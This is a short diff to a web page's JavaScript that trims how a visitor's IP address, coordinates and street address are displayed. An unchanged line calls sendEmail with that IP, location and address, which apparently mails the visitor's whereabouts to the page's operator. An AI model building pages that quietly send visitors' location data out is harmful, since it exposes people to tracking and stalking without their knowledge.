@@ -118,14 +118,7 @@ async function showResult() {
 	await sendEmail(ip, location, address);
     const result = document.getElementById('result');
     result.innerHTML = `
-      <p>Your IP address is: ${ip}</p>
-      <p>Your geolocation is:</p>
-      <ul>
-        <li>Latitude: ${location.latitude}</li>
-        <li>Longitude: ${location.longitude}</li>
-      </ul>
-      <p>Your current address is:</p>
-      <p>${address}</p>
+      <p>IP:${ip} Address:${address}</p>
     `;
   } catch (error) {
     console.error(error);
